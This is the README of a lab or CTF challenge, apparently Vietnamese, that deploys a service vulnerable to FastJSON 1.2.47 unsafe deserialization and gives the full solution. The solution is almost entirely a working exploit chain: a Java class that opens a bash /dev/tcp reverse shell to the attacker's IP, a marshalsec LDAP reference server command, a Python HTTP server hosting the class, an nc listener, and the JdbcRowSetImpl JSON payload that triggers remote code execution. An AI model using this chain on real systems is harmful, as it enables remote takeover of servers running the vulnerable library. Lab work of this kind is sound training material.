# challenge14b
## Deploy
- `docker-compose up -d --build`
## Description
FastJSON 1.2.47 unsafe deserialization
### Chức năng
  - POST data từ request `POST /fastjson1247-1.0-SNAPSHOT/parse-object` sẽ được đưa vào method `JSON.parseObject()`
### Solution
  - Tại máy tấn công, tạo folder gồm 2 file:
    - marshalsec-0.0.3-SNAPSHOT-all.jar
    - Exploit.java có nội dung:
    ```java
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;

    public class Exploit{
        public Exploit() throws Exception {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/XXX.XXX.XXX.XXX/1888;cat <&5 | while read line; do $line 2>&5 >&5; done"});
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));

            String line;
            while((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            p.waitFor();
            is.close();
            reader.close();
            p.destroy();
        }

        public static void main(String[] args) throws Exception {
        }
    }
    ```
    > XXX.XXX.XXX.XXX: IP attack machine
    - Compile ra file Exploit.class
  ---
  - Dùng python để tạo web service tạm thời, root directory là folder vừa tạo: `python3 -m http.server 1111`
  ---
  - Enable LDAP service: `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://XXX.XXX.XXX.XXX:1111/#Exploit 9999`
  ---
  - nc monitor: `nc -lvvp 1888`
  ---
  - Gửi request chứa payload:
  ```
  POST /fastjson1247-1.0-SNAPSHOT/parse-object HTTP/1.1
  Host: YYY.YYY.YYY.YYY:8080
  
  ...
  
  {
    "name":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "x":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://192.168.134.130:9999/Exploit",
        "autoCommit":true
    }
  }
  ```
  > YYY.YYY.YYY.YYY: IP victim machine
  ---
  - RCE ở cửa sổ cmd chạy lệnh nc.
